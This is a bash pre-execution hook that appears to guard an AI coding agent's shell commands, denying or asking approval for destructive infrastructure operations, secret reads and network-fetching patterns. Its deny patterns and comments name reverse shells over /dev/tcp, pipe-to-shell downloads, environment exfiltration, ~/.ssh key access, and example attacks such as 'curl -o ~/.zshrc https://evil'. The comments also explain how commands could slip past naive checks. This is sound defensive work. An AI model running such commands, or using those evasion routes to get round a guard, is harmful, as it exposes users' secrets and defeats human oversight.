#!/usr/bin/env bash
# PreToolUse guard for Bash commands.
# Runs in ALL modes — including the --dangerously-skip-permissions alias — so it
# is the real backstop there, where settings.json allow/ask/deny is bypassed.
#   deny = destructive infra / system / secret-exfiltration (do it by hand)
#   ask  = mutating infra you should confirm in the moment
# NOTE: no `set -e` — grep returning 1 on "no match" must not kill the script.
set -uo pipefail

input="$(cat)"
cmd="$(printf '%s' "$input" | jq -r '.tool_input.command // empty')"
[[ -n "$cmd" ]] || exit 0

emit() {
  jq -nc --arg d "$1" --arg r "$2" \
    '{hookSpecificOutput:{hookEventName:"PreToolUse",permissionDecision:$d,permissionDecisionReason:$r}}'
  exit 0
}
deny() { emit deny "$1"; }
ask()  { emit ask  "$1"; }

# has: match anywhere (for content patterns that are dangerous regardless).
has() { grep -Eq "$1" <<<"$cmd"; }
# at: match only at COMMAND POSITION — start of line or right after a shell
# separator (; && || |). This stops phrases quoted inside `git commit -m "..."`,
# echo, or prose from being treated as real commands.
CP='(^|[;&|]|&&|\|\|)[[:space:]]*'
at() { grep -Eq "${CP}$1" <<<"$cmd"; }

# Segment matchers. `has` scans the WHOLE command, which is the wrong question
# when asking "does THIS command carry that flag": in
#   git -C /repo pull && ansible-playbook site.yml
# a bare `has` reads git's -C as ansible's --check and disarms the gate.
#
# Splitting has to understand quoting, or it breaks BOTH ways. Naive splitting
# on every ; and | tore ordinary curl arguments in half —
#   curl -H 'Cookie: a=1; b=2' -o ~/.zshrc https://evil
# put the head in one piece and the -o in the next, so no segment had both and
# the write went through; and it fired spuriously on quoted prose, turning
#   git commit -m "cleanup; rm -r old files"
# into a recursive-rm confirmation. So: walk the string, track ' and " state,
# and split only on UNQUOTED separators. `&` splits too (a URL query string with
# & is quoted in practice; an unquoted one really is a job-control operator),
# and `(` `)` split so a command inside $(...) is a segment head of its own.
# Written to a variable via a quoted heredoc: awk needs both quote characters
# as literals, and nesting them inside a shell string is where this breaks.
SPLIT_AWK=$(cat <<'AWK'
{
  n = length($0); out = ""; q = ""
  for (i = 1; i <= n; i++) {
    c = substr($0, i, 1)
    if (q != "") {                                  # внутри кавычек
      if (c == "\\" && q == "\"") { i++; out = out c substr($0, i, 1); continue }
      if (c == q) q = ""
      out = out c
      continue
    }
    if (c == "\\") { i++; out = out c substr($0, i, 1); continue }
    if (c == "'" || c == "\"") { q = c; out = out c; continue }
    if (c == ";" || c == "|" || c == "&" || c == "(" || c == ")") {
      print out; out = ""; continue
    }
    out = out c
  }
  print out
}
AWK
)
segs() { printf '%s\n' "$cmd" | awk "$SPLIT_AWK"; }
# Все три — конвейером, а не циклом по сегментам. Цикл с `grep` на каждой
# итерации выглядел безобиднее, но hook запускается на КАЖДОЙ команде, а
# heredoc с телом скрипта режется на тысячи сегментов: замер на команде в
# 289 КБ дал больше трёх минут и десятки тысяч порождённых процессов вместо
# нескольких. Здесь число процессов постоянно и не зависит от длины команды.
# `-q` намеренно не используется в последнем звене: он закрывает пайп на первом
# совпадении, вышестоящий grep получает SIGPIPE, и под `pipefail` успешный
# поиск вернул бы ненулевой статус.
#
# segment headed by $1 that ALSO matches $2
seg_with() { segs | grep -E "^[[:space:]]*$1" | grep -E "$2" >/dev/null; }
# any segment headed by $1 — the same question `at` answers, but decided by the
# quote-aware splitter instead of CP. Use it when the rule is about the command
# name alone: CP does not treat `$(` as a command position, so `at` misses
# `echo $(docker volume rm x)`.
seg_head() { segs | grep -E "^[[:space:]]*$1" >/dev/null; }
# segment headed by $1 that does NOT match $2. Пусто на входе — значит такой
# команды в строке нет, и спрашивать не о чем: grep -v тоже вернёт 1.
seg_without() { segs | grep -E "^[[:space:]]*$1" | grep -vE "$2" >/dev/null; }

# ---- DENY: destructive infrastructure (manual only) ----
at 'terraform[[:space:]]+destroy\b'                  && deny "terraform destroy — run it manually"
at 'terraform[[:space:]]+state[[:space:]]+(rm|mv)\b' && deny "terraform state rm/mv — manual only"
at 'kubectl[[:space:]]+(delete|drain)\b'             && deny "kubectl delete/drain — manual only"
at 'helm[[:space:]]+(uninstall|rollback)\b'          && deny "helm uninstall/rollback — manual only"
at 'nomad[[:space:]]+(job[[:space:]]+(stop|purge)|node[[:space:]]+drain|alloc[[:space:]]+stop)\b' \
                                                     && deny "nomad stop/purge/drain — manual only"
# Same class as `docker system prune`, which is already denied in settings.json:
# it wipes every unused volume, and named volumes are somebody's data.
at 'docker[[:space:]]+volume[[:space:]]+prune\b'     && deny "docker volume prune wipes unused volumes — manual only"

# ---- DENY: destructive system / secret exfiltration (matters most under bypass) ----
at 'rm[[:space:]]+-[a-zA-Z]*[rR][a-zA-Z]*[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*(/|~|\$HOME|/\*|~/\*|\$HOME/\*)([[:space:]]|$)' \
                                                     && deny "recursive delete of / or home"
at 'sudo\b'                                          && deny "sudo — run it manually"
if at '(cat|less|more|head|tail|bat)[[:space:]]+[^|;&]*\.env(\.[[:alnum:]_-]+)?' \
   && ! has '\.env\.(example|sample|template|dist)'; then deny "reading a plaintext .env file"; fi
at '(printenv|env|set)\b[^|]*\|[^|]*(base64|curl|wget|nc|xxd)' && deny "environment-variable exfiltration"
at '(curl|wget)\b[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(bash|sh|zsh)\b' && deny "pipe-to-shell from network"
has '>[[:space:]]*/dev/tcp/'                          && deny "reverse shell"
# Раньше матчились только id_* и файлы с "key" в имени — реальные ключи
# (private_ed25519, work_ed25519, cluster-autossh, utm_test) проходили свободно.
# Теперь блокируется весь ~/.ssh целиком по литералу ".ssh" с границей слова
# (не даёт ложно сработать на .sshd/.ssh-что-то-с-буквой-сразу-после).
# NB: `has` матчит в любом месте строки команды, включая heredoc/echo-содержимое —
# запись файла с упоминанием "~/.ssh/..." в тексте тоже блокируется. Сузить до
# позиции аргумента нельзя: с точки зрения регулярки путь-как-аргумент и
# путь-как-текст-внутри-heredoc неразличимы без полного разбора шелла.
has '(\.ssh\b|\.config/sops/age|\bage-keygen\b)' && deny "touching private keys"

# ---- DENY: committing a secret (staged diff scanned by gitleaks) ----
# Fires only on a real `git commit` at command position, and only if gitleaks
# is installed. Exit 1 == leak found; any other code (git failure / gitleaks
# error) is treated as "nothing to block" so we never false-deny.
if at 'git[[:space:]]+commit\b' && command -v gitleaks >/dev/null 2>&1; then
  git diff --cached --no-color 2>/dev/null | gitleaks stdin --no-banner --redact >/dev/null 2>&1
  [[ ${PIPESTATUS[1]} -eq 1 ]] \
    && deny "gitleaks flagged a secret in the staged diff — review it, then commit by hand or add a .gitleaksignore entry if it is a false positive"
fi

# ---- Interpreters: judge the code, not the command name ----
# python/python3/node sit in settings.json `allow` on purpose. A prefix rule can
# only ever see `python3 -c`; everything that decides safe-vs-not lives inside
# the quotes, so the whole class had to be `ask` and every read-only one-liner
# paid for it. The decision belongs here, where the full command string is
# visible — and this hook runs in bypass, where allow rules stop applying.
# MUST stay below the gitleaks deny: ask() exits, so an ask above a deny
# silences it, and `python3 -c "..." && git commit` would skip the secret scan.
# `has` matches inside heredocs — normally a caveat (see the .ssh note above),
# here it is the mechanism: the heredoc body IS the script we need to read.
# deny before ask within the block: a script that shells out AND writes is denied.
#
# The gate tolerates what people actually type — a full path, an env/uv wrapper,
# leading VAR=val, and an opening `(` or `$(` — because `x=$(python3 -c ...)`
# and `uv run python -c ...` are everyday forms, not evasions, and a gate that
# only sees a bare leading `python3` misses them (`Bash(uv:*)` is in allow).
#
# The trailing [[:space:]] is load-bearing, not decoration. With `\b` there, the
# `(` anchor turned every conventional commit subject into an interpreter
# invocation: `git commit -m "fix(node): swap child_process for execa"` matched
# on `(node` and then hit the shell-out pattern on `child_process` — a hard
# deny, which is not user-approvable, on the commit style CLAUDE.md mandates.
# A real invocation always has an argument after the name; `fix(node):` does not.
#
# uv's wrapper allows arbitrary tokens before the interpreter: `uv run --with
# requests python -c ...` is THE idiomatic uv one-liner, and `Bash(uv:*)` is
# allow-listed, so missing it means arbitrary shell-out with no prompt anywhere.
INTERP='(^|[;&|(`]|&&|\|\||\$\()[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*((env|nice|nohup)[[:space:]]+|uv[[:space:]]+run[[:space:]]+([^[:space:]]+[[:space:]]+)*)*([^[:space:]]*/)?(python3?|node)[[:space:]]'
if has "$INTERP"; then
  # `__import__("os").system` and `from shutil import rmtree` reach the same
  # calls without ever writing the literal `os.system` / `shutil.rmtree`.
  has 'os\.(system|popen|exec[lv]|spawn)|\bsubprocess\b|\bpty\.spawn\b|child_process|\b(exec|spawn|execFile)Sync\b|__import__\([^)]*(os|subprocess|pty)' \
                                                     && deny "interpreter shelling out — that escapes every pattern in this guard; write the shell command directly"
  has '\brmtree\(|os\.removedirs|\b(rm|rmdir)Sync\([^)]*recursive|\bfs\.rm(dir)?\([^)]*recursive' \
                                                     && deny "recursive tree delete from an interpreter"
  has '\b(urllib|requests|httpx|http\.client|socket|ftplib|smtplib|paramiko)\b|\bfetch\(|\baxios\b' \
                                                     && ask "interpreter opening the network — confirm?"
  # Quote class includes a backslash: inside `python3 -c "..."` the inner quotes
  # arrive escaped (open(\"f\",\"w\")), so a bare ['"] class misses the real case.
  has "open\([^)]*[\\'\"][wax][+bt]?[\\'\"]|\.write_(text|bytes)\(|\bfs\.(writeFile|appendFile|createWriteStream)|\bwriteFileSync\(" \
                                                     && ask "interpreter writing a file — confirm?"
  has 'os\.(remove|unlink|rmdir)\(|\.unlink\(\)|\b(unlink|rm|rmdir)Sync\(|\bfs\.(unlink|rm|rmdir)\(' \
                                                     && ask "interpreter deleting a file — confirm?"
fi

# ---- ASK: mutating infrastructure (confirm in the moment) ----
at 'terraform[[:space:]]+apply\b'           && ask "terraform apply — confirm?"
at 'kubectl[[:space:]]+apply\b'             && ask "kubectl apply — confirm?"
at 'helm[[:space:]]+(install|upgrade)\b'    && ask "helm install/upgrade — confirm?"
at 'nomad[[:space:]]+job[[:space:]]+run\b'  && ask "nomad job run — confirm?"
at 'chmod[^|]*\b777\b'                        && ask "chmod 777 — confirm?"

# ---- ASK by argument, not by command name ----
# These three were blanket `ask` entries in settings.json and the top prompt
# generators there — ansible-playbook 34, curl 22, git config 13 fires across
# the whole transcript history — almost always on a dry-run or read-only form.
# A prefix rule sees only the command name and cannot tell those apart.

# --check/-C IS the dry run CLAUDE.md mandates; asking about it is asking about
# nothing. Per segment: `ansible-playbook x --check && ansible-playbook x` is the
# dry-run-then-apply idiom, and the second half is exactly what must be confirmed.
seg_without 'ansible-playbook\b' '(^|[[:space:]])(--check|-C)([[:space:]]|$)' \
                                              && ask "ansible-playbook without --check — confirm?"

# A GET reads. Confirm the verbs and the bodies that change something on the far
# end. `-d@file` and `--data-binary@file` take no space or `=`, and they are the
# canonical exfiltration form, so `@` has to close the alternation too.
seg_with 'curl\b' '(-X[[:space:]]*(POST|PUT|DELETE|PATCH)|--request[[:space:]]+(POST|PUT|DELETE|PATCH)|--json\b|(^|[[:space:]])(-d|--data(-raw|-binary|-urlencode)?|-F|--form|-T|--upload-file)([[:space:]]|=|@))' \
                                              && ask "curl with a mutating method or body — confirm?"

# git config --get/--list only read; everything else edits identity or repo
# config. Per segment, or `git config --list && git config core.hooksPath evil`
# reads as a plain lookup — and core.hooksPath is arbitrary code on the next
# git operation in that repo.
seg_without 'git[[:space:]]+config\b' '(--get|--list|--name-only)' \
                                              && ask "git config writes — confirm?"

# `docker compose:*` is in settings.json allow, so nothing else gates this:
# `down -v` destroys named volumes, which is not the reversible local operation
# the rest of the compose lifecycle is.
seg_with 'docker([[:space:]]+|-)compose[[:space:]]+down\b' '(^|[[:space:]])(-v|--volumes)([[:space:]]|$)' \
                                              && ask "docker compose down -v destroys named volumes — confirm?"

# `docker volume:*` is in allow for ls/inspect/create; rm is the one that ends data.
seg_head 'docker[[:space:]]+volume[[:space:]]+rm\b' \
                                              && ask "docker volume rm destroys the volume's data — confirm?"

# Recursive rm. The blanket `Bash(rm:*)` ask was dropped because deleting a
# scratch file is routine — `-r` is where it stops being routine. The deny above
# only fires when the target is exactly / ~ or $HOME, so `rm -Rf ~/Documents`
# had nothing on it at all. 18 recursive rm across the whole transcript history,
# so this costs almost nothing, and under bypass it is the only gate left.
# Per segment, or `ls -r && rm scratch.txt` would read ls's -r as rm's.
seg_with 'rm\b' '(^|[[:space:]])-[a-zA-Z]*[rR][a-zA-Z]*([[:space:]]|$)' \
                                              && ask "recursive rm — confirm the target?"

# curl writing to disk: -o/-O put remote content into a local file, and
# `curl -o ~/.zshrc URL` is a remote-controlled overwrite of a startup file.
# `-o /dev/null` is the status-probe idiom and discards the body — 5 of the 14
# -o uses in history are exactly that, so it stays silent.
#
# The exemption is decided PER TARGET, not per command. Asking "does this
# command mention /dev/null anywhere" let one probe cover a real write:
#   curl -o /dev/null https://probe && curl -o ~/.zshrc https://evil
# and curl accepts repeated `-o FILE URL` pairs, so that is reachable without
# even a second command. So: pull out every output target and judge each one.
# `-[a-zA-Z]*o` catches the bundled short form (`curl -sSLo out`), and the value
# may be attached with no separator at all (`curl -o/Users/x/.zshrc URL` really
# does write that file).
curl_writes_a_file() {
  segs \
    | grep -E '^[[:space:]]*curl\b' \
    | grep -Eo -- '(^|[[:space:]])(-[a-zA-Z]*o|--output)([[:space:]]|=)*[^[:space:]]*' \
    | sed -E 's/^[[:space:]]*(-[a-zA-Z]*o|--output)[[:space:]=]*//' \
    | grep -vE '^(/dev/null)?$' >/dev/null
}
# -O/--remote-name lets the server pick the filename; bundles as -sSLO, which is
# one of the most common curl idioms there is.
seg_with 'curl\b' '(^|[[:space:]])(-[a-zA-Z]*O|--remote-name)([[:space:]]|$)' \
                                              && ask "curl -O writes a file named by the server — confirm?"
curl_writes_a_file                            && ask "curl writing the response to a file — confirm the path?"

# ---- ASK: broad git-add sweeps everything, incl. the private submodule ----
at 'git[[:space:]]+add[[:space:]]+([^;&|]*[[:space:]])?(-A|--all|\.)([[:space:]]|$)' \
                                              && ask "git add -A/./--all stages everything — prefer explicit paths?"

exit 0
